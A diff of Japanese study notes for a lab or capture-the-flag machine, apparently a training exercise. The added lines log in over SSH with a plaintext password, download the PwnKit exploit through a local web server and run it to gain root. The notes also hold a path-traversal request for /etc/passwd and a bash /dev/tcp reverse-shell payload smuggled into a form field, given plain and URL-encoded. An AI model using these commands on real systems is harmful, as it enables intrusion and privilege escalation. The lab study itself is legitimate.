@@ -38,6 +38,24 @@
 41. niceをGTFOBinsでやってみる
 42. サーバの公開鍵からfingerprintはどうやって作られる?
 
+- 始める前にスナップショットをとる
+
+## sshのParrot側のポートは何?
+- まずPotatoにsshで接続する
+- `ssh webadmin@$IP` Password:dragon
+- `ss -tnp | grep :22` または `netstat -ant | grep :22`
+- Peer Address:Portと書いてあるとこ
+
+## pkexecをする
+- 前回の続きでsshの接続してあるのを前提
+- Parrot側でPwnKitのあるとこでサーバを起動する
+  - `python -m http.server 8080`
+- Potato側でPwnKitを取得する
+  - `wget http://Parrotのアドレス:8080/PwnKit`
+- ファイルを実行してrootになる
+  - `chmod +x PwnKit`
+  - `./PwnKit`     
+
 ## curl /etc/passwd
 - `curl -X POST -b "pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh" -d "file=../../../../../etc/passwd"  "http://$IP/admin/dashboard.php?page=log"`
 
@@ -45,7 +63,9 @@
 - ダッシュボードのlogのコードはshell_exec関数を使っているので、osコマンンドインジェクションを利用してreverse-shellをできるんではないかと考える。
 - `nc -nlvp 9001`をParrotで待ち受ける
 - burpでrequestを以下のように書き換える
-- `file=log_03.txt;bash -c 'exec bash -i &>/dev/tcp/192.168.56.?/9001 <&1`
+- ~`file=log_03.txt;bash -c 'exec bash -i &>/dev/tcp/192.168.56.?/9001 <&1`~
+- URLEncode version
+  - `file=log_03.txt;bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F192.168.56.104%2F9001+%3C%261%27`
 - www-dataが返ってくる
 
 ## networkとhost部を分けてfpingする
